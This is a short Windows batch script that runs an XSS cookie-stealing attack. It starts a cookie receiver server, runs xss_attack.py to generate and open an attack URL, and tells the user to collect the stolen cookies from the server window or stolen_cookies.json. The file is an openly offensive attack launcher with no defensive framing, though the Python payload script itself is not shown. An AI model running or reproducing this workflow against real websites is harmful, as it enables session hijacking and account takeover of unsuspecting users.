@echo off
echo ========================================
echo XSS Cookie Stealing Attack
echo ========================================
echo.
echo This script will help you execute an XSS attack to steal cookies.
echo.
echo Step 1: Starting Cookie Receiver Server...
echo.

start "Cookie Receiver Server" cmd /k "python xss_attack.py --start-server"

timeout /t 3 /nobreak >nul

echo.
echo Step 2: Generating and opening attack URL...
echo.

python xss_attack.py --execute

echo.
echo ========================================
echo Attack executed!
echo ========================================
echo.
echo The cookie receiver server is running in another window.
echo Check that window for stolen cookies, or view stolen_cookies.json
echo.
pause

